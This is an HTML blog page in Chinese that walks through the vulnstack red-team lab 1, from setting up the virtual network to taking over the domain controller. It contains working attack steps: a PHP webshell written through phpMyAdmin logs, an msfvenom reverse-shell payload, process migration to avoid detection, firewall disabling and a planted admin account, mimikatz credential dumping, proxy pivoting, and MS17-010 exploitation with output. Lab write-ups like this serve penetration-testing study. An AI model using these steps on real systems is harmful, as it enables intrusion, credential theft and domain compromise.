@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>vulnstack 红队一 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="环境搭建配置网卡  编辑-&gt;虚拟网络编辑器   自定义为仅主机模式 配置win7网络 添加两块网卡,一块为VMnet1(仅主机模式),一块为VMnet8(net模式连通外网) 配置VMnet1网卡 (win7)  DNS服务器是windows server的ip, vulnstack配置好了 使用win7 ping一下 windows server, 能ping同则成功 配置好后加入域  控">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnstack 红队一">
+<meta property="og:url" content="http://example.com/2021/01/21/vulnstack-%E7%BA%A2%E9%98%9F%E4%B8%80/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="环境搭建配置网卡  编辑-&gt;虚拟网络编辑器   自定义为仅主机模式 配置win7网络 添加两块网卡,一块为VMnet1(仅主机模式),一块为VMnet8(net模式连通外网) 配置VMnet1网卡 (win7)  DNS服务器是windows server的ip, vulnstack配置好了 使用win7 ping一下 windows server, 能ping同则成功 配置好后加入域  控">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212181704.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212182040.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212183004.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212182939.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212183757.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181346.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181451.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181505.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213185854.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213211741.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201217204027.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201217203624.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213215145.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201214195912.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215021734.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215022410.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215022450.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215145143.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215181758.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221002413.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221001730.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221001711.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221002125.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221003137.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221005804.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221005810.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010133.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010140.png">
+<meta property="og:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010055.png">
+<meta property="article:published_time" content="2021-01-21T10:44:33.000Z">
+<meta property="article:modified_time" content="2021-01-21T10:45:15.231Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212181704.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-vulnstack-红队一" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/21/vulnstack-%E7%BA%A2%E9%98%9F%E4%B8%80/" class="article-date">
+  <time class="dt-published" datetime="2021-01-21T10:44:33.000Z" itemprop="datePublished">2021-01-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      vulnstack 红队一
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>配置网卡</p>
+<blockquote>
+<p>编辑-&gt;虚拟网络编辑器</p>
+</blockquote>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212181704.png" alt="QQ截图20201212181654"></p>
+<p>自定义为仅主机模式</p>
+<p>配置win7网络</p>
+<p>添加两块网卡,一块为VMnet1(仅主机模式),一块为VMnet8(net模式连通外网)</p>
+<p>配置VMnet1网卡 (win7)</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212182040.png" alt="QQ截图20201212182018"></p>
+<p>DNS服务器是windows server的ip, vulnstack配置好了</p>
+<p>使用win7 ping一下 windows server, 能ping同则成功</p>
+<p>配置好后加入域</p>
+<blockquote>
+<p>控制面板-&gt;系统安全-&gt;系统-&gt;高级系统设置,  加入域时会提示已有域用户,登录即可.</p>
+</blockquote>
+<p>此时kali win7都使用VMnet8 都处于同一网段下, 都可访问外网</p>
+<p>kali</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212183004.png" alt="QQ截图20201212182930"></p>
+<p>win7</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212182939.png" alt="QQ截图20201212182900"></p>
+<h1 id="拿下win7"><a href="#拿下win7" class="headerlink" title="拿下win7"></a>拿下win7</h1><blockquote>
+<p>如果访问不了网站可能是防火墙的原因, 将apache mysql的程序全部允许通过防火墙即可</p>
+</blockquote>
+<p>目录扫描</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201212183757.png" alt="QQ截图20201212183749"></p>
+<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>弱口令弱口令登录(root root)</p>
+<ol>
+<li><p>日志拿shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查看日志状况 show variables like &quot;%log%&quot;</span><br><span class="line">开启日志 set global general_log=&#x27;on&#x27;</span><br><span class="line">修改日志路径 set global general_log_file=&#x27;C:\\phpStudy\\WWW\\test2.php&#x27;</span><br><span class="line">查看开启情况 show variables like &quot;general_log%&quot;</span><br><span class="line"></span><br><span class="line">写入shell</span><br><span class="line">select &quot;&lt;?php eval($_POST[123]);?&gt;&quot;</span><br></pre></td></tr></table></figure></li>
+<li><p>yxcms</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现备份文件, 是yxcms 版本 1.2.1</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">访问index.php?r=admin登录后台</span><br><span class="line">admin 123456</span><br><span class="line"></span><br><span class="line">在前台模板 index_index.php中插入一句话</span><br><span class="line"></span><br><span class="line">访问http://192.168.137.129/yxcms/即可getshell</span><br></pre></td></tr></table></figure>
+
+<h1 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h1><h2 id="建立shell"><a href="#建立shell" class="headerlink" title="建立shell"></a>建立shell</h2><ol>
+<li><p>msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">生成windows x64木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=12345 -f exe -o hack.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181346.png" alt="QQ截图20201213180407"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">建立监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">注意对应x64</span><br><span class="line">set LHOST 目标机ip</span><br><span class="line">set LPORT 12345</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181451.png" alt="QQ截图20201213181446"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在蚁剑中执行 start hack.exe</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213181505.png" alt="QQ截图20201213180336"></p>
+<ol>
+<li>进程迁移</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">当执行hack.exe后进程是十分容易被发现的</span><br><span class="line">migrate -N explorer.exe  迁移到任务管理器中</span><br><span class="line">原先的hack.exe进程也会消失</span><br><span class="line"></span><br><span class="line">设置反弹shell后自动迁移</span><br><span class="line">set autorunscript migrate -N explorer.exe</span><br><span class="line">或者</span><br><span class="line">set autorunscript migrate -f (默认迁移到记事本)</span><br></pre></td></tr></table></figure>
+
+<h2 id="开启远程登录"><a href="#开启远程登录" class="headerlink" title="开启远程登录"></a>开启远程登录</h2><p>关闭防火墙</p>
+<p><code>输入shell进入windows的cmd</code></p>
+<p>如果有乱码, 可以输入<code>chcp 65001</code>(65001就是utf-8, 将cmd的编码和kali统一)</p>
+<p>查看防火墙状态</p>
+<p><code>netsh firewall show state</code></p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213185854.png" alt="QQ截图20201213185542"></p>
+<p>​    关闭防火墙</p>
+<p>​    <code>netsh firewall set opmode disable </code></p>
+<p>​    开启3389端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不知道为啥 kali上反弹的shell不能执行这个命令, 只能使用蚁剑执行</span><br><span class="line">REG ADD HKLMSYSTEMCurrentControlSetControlTerminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>​    添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test 123root! /add</span><br><span class="line">net localgroup administrators test /add</span><br></pre></td></tr></table></figure>
+
+<p>​    远程登录</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213211741.png" alt="QQ截图20201213211727"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 查询ip 域信息</span><br><span class="line">systeminfo 查询系统信息</span><br><span class="line">net config Workstation 查询计算机信息, 域信息</span><br><span class="line">net user 本机用户</span><br><span class="line">net user /domain 查询域用户</span><br><span class="line">net view /domain:god god是域名, 查看域主机名</span><br><span class="line">net user test /domain 查询域内test用户</span><br><span class="line">net user /domain test 123 修改test用户密码为123</span><br><span class="line">net group /domain 查询域工作组</span><br><span class="line">net group 组名 /domain 查询域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain 查询域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain 查看域控制器</span><br><span class="line">tasklist 查询进程 是否有杀毒软件之类的</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+
+
+<p>域内主机存活探测</p>
+<ol>
+<li><p>ICMP协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">也就是ping命令</span><br><span class="line">进入shell执行</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL&quot;</span><br><span class="line">探测存活主机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201217204027.png" alt="QQ截图20201217204020"></p>
+</li>
+<li><p>msf的<code>udp_probe</code></p>
+<blockquote>
+<p>需要添加socks代理, 在后面</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.52.0/24</span><br><span class="line">set threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201217203624.png" alt="QQ截图20201217203619"></p>
+</li>
+</ol>
+<p>发现DNS server一般为域控</p>
+<img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201213215145.png" alt="QQ截图20201213215114" style="zoom:150%;" />
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201214195912.png" alt="QQ截图20201213220021"></p>
+<p>这里提权十分简单, 实际情况可能更复杂</p>
+<h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">自带模块</span><br><span class="line">post/windows/gather/smart_hashdump</span><br><span class="line">使用mimikatz</span><br><span class="line">	load mimikatz 加载模块</span><br><span class="line">	mimikatz_command -f sekurlsa::searchPasswords 获取明文密码</span><br><span class="line">使用kiwi</span><br><span class="line">	load kiwi</span><br><span class="line">	creds_all  获取密码</span><br><span class="line">	kiwi_cmd mimikatz命令  可以使用mimikatz所有命令</span><br><span class="line">		kiwi_cmd sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">上传mimikatz获取明文</span><br><span class="line">https://github.com/gentilkiwi/mimikatz/releases</span><br><span class="line">上传文件</span><br><span class="line">meterpreter &gt; upload /home/alanlitl//mimikatz_trunk/x64/mimikatz.exe C:\\phpStudy\\WWW\\yxcms</span><br><span class="line">进入windows的shell运行mimikatz</span><br><span class="line">提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">获取密码</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
+
+<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24 内网网段</span><br><span class="line">meterpreter &gt; run autoroute -p 查看添加的路由</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215021734.png" alt="QQ截图20201215021729"></p>
+<h2 id="添加socks4代理"><a href="#添加socks4代理" class="headerlink" title="添加socks4代理"></a>添加socks4代理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">将上面的进程移到后台(千万不能结束或者新建msf窗口)</span><br><span class="line">background 或者 session 2(未使用的session数字) 添加到后台</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvhost kali的ip</span><br><span class="line">set srvport 1080(如果创建失败可能是端口占用, 使用其他端口即可)</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215022410.png" alt="QQ截图20201215022358"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改/etc/proxychains.conf文件</span><br><span class="line">改为自己socks的ip port即可</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215022450.png" alt="QQ截图20201215022445"></p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215145143.png" alt="QQ截图20201215145101"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前面已经找到了内网的其他主机</span><br><span class="line">192.168.52.141和192.168.52.138</span><br></pre></td></tr></table></figure>
+
+<h1 id="Win-2K3"><a href="#Win-2K3" class="headerlink" title="Win 2K3"></a>Win 2K3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line"></span><br><span class="line">成功拿下</span><br><span class="line">但是执行mimikatz时却失败了</span><br><span class="line"></span><br><span class="line">但我们在前面已经拿到了密码</span><br><span class="line">2313root!  我更改过</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201215181758.png" alt="QQ截图20201215181738"></p>
+<h1 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h1><blockquote>
+<p>开始在kali上使用<code>exploit/windows/smb/psexec</code>模块一直失败, 以为是模块问题, 结果是域控防火墙开着, 只能在win7上使用PsExec.exe进行登录</p>
+</blockquote>
+<h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><blockquote>
+<p>下载地址:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+</blockquote>
+<p>上传</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221002413.png" alt="QQ截图20201220215210"></p>
+<p>在已经拿下的win7上执行(远程桌面)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.52.138 -u liukaifeng01 -s cmd.exe  输入密码后进入交互shell</span><br><span class="line">一定要加-s以system权限执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221001730.png" alt="QQ截图20201220231352"></p>
+<blockquote>
+<p>这时已经相当于拿下域控了, 我们现在开启远程桌面</p>
+</blockquote>
+<h3 id="关闭域控防火墙"><a href="#关闭域控防火墙" class="headerlink" title="关闭域控防火墙"></a>关闭域控防火墙</h3><p>查看防火墙状态(win8 开始就有了不同的防火墙命令)</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221001711.png" alt="QQ截图20201220215515"></p>
+<p>关闭防火墙</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221002125.png" alt="QQ截图20201220231352"></p>
+<p>现在就可以使用msf远程登录了</p>
+<p>要在开启proxychains代理的情况下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp  (这里要使用主动连接, 域控在内网里面.我们无法访问)</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbpass 2313root!</span><br><span class="line">set smbuser liukaifeng01</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221003137.png" alt="QQ截图20201220231430"></p>
+<h3 id="远程连接域控"><a href="#远程连接域控" class="headerlink" title="远程连接域控"></a>远程连接域控</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置远程桌面端口</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line">开启远程桌面</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
+
+<p>在windows下配置代理</p>
+<p>使用proxifier(网上有许多教程)</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221005804.png" alt="屏幕截图 2020-12-21 000138"></p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221005810.png" alt="QQ截图20201221000109"></p>
+<p>其中address是你的kali的ip, kali要先搭建好proxychains</p>
+<p>代理好后,在浏览器访问<code>192.168.52.99或者192.168.52.138</code></p>
+<p>如果能访问则代理成功</p>
+<blockquote>
+<p>这里还遇到一个小坑, 输入账号的时候不能使用直接使用<code>liukaifeng01</code>,要使用GOD\liukaifeng01, 否则就会提示密码错误</p>
+</blockquote>
+<p>错误的账户</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010133.png" alt="QQ截图20201220235829"></p>
+<p>使用正确的账户登录</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010140.png" alt="QQ截图20201220235852"></p>
+<p>远程连接成功</p>
+<p><img src="https://alanlitl.oss-cn-chengdu.aliyuncs.com/picgo/20201221010055.png" alt="QQ截图20201220235906"></p>
+<h3 id="使用-ms17-010"><a href="#使用-ms17-010" class="headerlink" title="使用 ms17-010"></a>使用 ms17-010</h3><p>在关闭防火墙的情况下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole   使用代理启动msf</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp  不出网使用正向连接</span><br><span class="line">set rhost 192.168.2.138 域ip</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br><span class="line">|S-chain|-&lt;&gt;-192.168.3.130:1080-&lt;&gt;&lt;&gt;-192.168.2.138:445-&lt;&gt;&lt;&gt;-OK</span><br><span class="line"></span><br><span class="line">[*] 192.168.2.138:445 - Target OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br><span class="line">[*] 192.168.2.138:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.2.138:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 192.168.2.138:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.2.138:445 - Executing the payload...</span><br><span class="line">[+] 192.168.2.138:445 - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">[*] Started bind TCP handler against 192.168.2.138:4444</span><br><span class="line">|S-chain|-&lt;&gt;-192.168.3.130:1080-&lt;&gt;&lt;&gt;-192.168.2.138:4444-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">[*] Sending stage (176195 bytes) to 192.168.2.138</span><br><span class="line">[*] Meterpreter session 1 opened (0.0.0.0:0 -&gt; 192.168.3.130:1080) at 2021-01-21 18:07:19 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">成功获取拿下域</span><br></pre></td></tr></table></figure>
+
+<p>参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/g0udan/p/12411937.html">https://www.cnblogs.com/g0udan/p/12411937.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/21/vulnstack-%E7%BA%A2%E9%98%9F%E4%B8%80/" data-id="ckp231ctc000dtcnx8rcu1pca" data-title="vulnstack 红队一" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/03/16/TP5-RCE%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          TP5 RCE分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/12/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">数据结构</div>
